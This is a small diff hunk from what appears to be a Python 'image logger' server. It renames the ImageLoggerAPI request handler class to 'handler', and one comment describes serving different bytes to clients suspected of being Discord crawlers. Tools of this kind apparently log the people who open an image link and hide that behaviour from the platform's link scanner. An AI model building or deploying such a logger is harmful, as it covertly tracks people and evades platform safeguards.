@@ -186,7 +186,7 @@ binaries = {
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
+class handler(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
